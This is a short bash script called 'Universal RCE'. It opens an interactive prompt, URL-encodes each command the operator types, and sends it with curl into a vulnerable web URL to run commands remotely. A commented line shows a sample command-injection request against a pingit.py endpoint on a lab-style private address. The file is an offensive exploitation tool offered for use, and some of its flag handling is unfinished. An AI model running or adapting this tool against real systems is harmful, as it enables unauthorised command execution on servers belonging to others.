#!/bin/bash

echo "Universal RCE (based on curl and perl) v0.1"

# help function
function helpmsg {
	echo "Usage:"
	echo "  $0 <vulnerable URL w/o spaces (%20)>^CMD^[more URL] [flags]"
	echo ""
	echo "  ^CMD^ will be replaced with RCE commands."
	echo "  '^' chars in URL will break the script and must be manually escaped (%5E)."
	echo "  When inputting cmds, use double backslashes for paths etc. (eg. c:\\\\...)."
	echo "  Commands cannot start with '-' char for now... " #It will be escaped but may break cmd"
	echo ""
	echo "		Flags:"
#	echo "		-u	URL encode commands"
	echo "		-h	This message"
	echo "		-i	disable curl ssl checking"
	echo "		-v	line to remove from return strings (eg. -v <br> etc.)"
	echo ""
	echo "This script uses curl to execute RCE and perl to encode CMD"
	echo ""
	exit 0
}

# check if there are arguments or display help
if [ -z $1 ]
then
	helpmsg
fi

# declare variables
cmdraw=""
cmd=""
cmdpathraw=$1
cmdpath_a=$(echo $cmdpathraw|cut -f 1 -d '^')
cmdpath_b=$(echo $cmdpathraw|cut -f 3 -d '^')

# check cmdpath_a != cmdpath_b
if [ "$cmdpath_a" = "$cmdpath_b" ] #|| [ "$(echo $cmdpathraw | grep ^CMD^)" = "$cmdpathraw" ]
then
	helpmsg
fi

# check if flags are set



# echo test	# place holder for breakpoint test


# create prompt and await commands
while [ "$cmdraw" != "exit" ]
do
	echo -ne '\nRCE> '
	read cmdraw
	#curl -s $urlencode "http://10.11.1.31/_vti_pingit/pingit.py?action=|$cmd" | grep -iv "<br>"

	# check for exit cmd
	if [ "$cmdraw" == "exit" ]
	then
		exit 0
	fi

# url encode cmd
## put in if statement

	# replace leading '-' in cmd - use while loop? while first char is - replace with %2D store in temp var and cut from cmdraw?
#		if [ "$(echo $cmdraw | cut -c 1)" = "-" ]
#		then
#			cmdraw=$(echo $cmdraw|sed 's/-/%2d/')
#		fi

		cmd=$(perl -MURI::Escape -e 'print uri_escape($ARGV[0])' "$cmdraw")

# execute RCE - added <br> grep v temp - REMOVE
	curl -s "$cmdpath_a$cmd$cmdpath_b" | grep -iv "<br>"
	
#	echo $cmdpath_a
#	echo $cmd
#	echo $cmdpath_b

done

